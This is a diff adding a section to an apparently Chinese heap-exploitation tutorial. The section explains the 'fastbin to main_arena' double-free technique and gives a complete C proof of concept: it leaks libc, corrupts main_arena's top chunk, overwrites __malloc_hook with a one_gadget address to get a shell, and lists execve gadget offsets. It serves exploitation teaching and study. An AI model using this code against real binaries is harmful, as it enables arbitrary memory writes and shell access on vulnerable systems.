@@ -237,3 +237,85 @@ constraints:
 
 ```
 
+***
+
+&emsp;&emsp;<font size=2>在这里额外介绍一个新的利用double free改写任意地址的技巧：fastbin to main_arena。就是把fastbin分配到main_arena上去，然后就可以修改main_arena上的数据达到我们的目的，比如说我们可以修改top堆块到任何位置（只要满足size检查），然后相当于就可以在任何地方分配堆块，进而可以修改任何地址的数据，不多说，demo放在下面，原理上面都已经分析过了：</font></br>
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	void *p1,*p2,*p3;
+	unsigned long* ptr;
+
+	p1=malloc(0x100);
+	p2=malloc(0x100);
+	free(p1);
+	unsigned long libc_base=*(unsigned long*)p1-0x3c4b78;
+	free(p2);
+	//fprintf(stderr,"libc base:%llx\n",libc_base);
+
+	p1=malloc(0x50);
+	p2=malloc(0x50);
+
+	p3=malloc(0x30);
+	free(p3);
+	ptr=(unsigned long*)p3;
+
+  // edit fastbin fd
+	*ptr=0x60;
+  // 0x60 in fastbinY
+	malloc(0x30);
+
+	free(p1);
+	free(p2);
+	free(p1);
+
+	malloc(0x50);
+	ptr=(unsigned long*)p1;
+  // edit fd to fastbinY where lays 0x60 we put on
+	*ptr=libc_base+0x3c4b30;
+	malloc(0x50);
+	malloc(0x50);
+
+	//chunk in the main_arena
+	p1=malloc(0x50);
+
+	// edit the top chunk
+	ptr=(unsigned long*)p1;
+	*(ptr+7)=libc_base+0x3c4b00;
+
+	// chunk on the __malloc_hook
+	p2=malloc(0x100);
+
+	//edit the __malloc_hook with one_gadget
+	ptr=(unsigned long*)p2;
+	*ptr=libc_base+0x4526A;
+
+	// getshell
+	malloc(0x100);
+
+	return 0;
+}
+
+/*
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+*/
+```
+
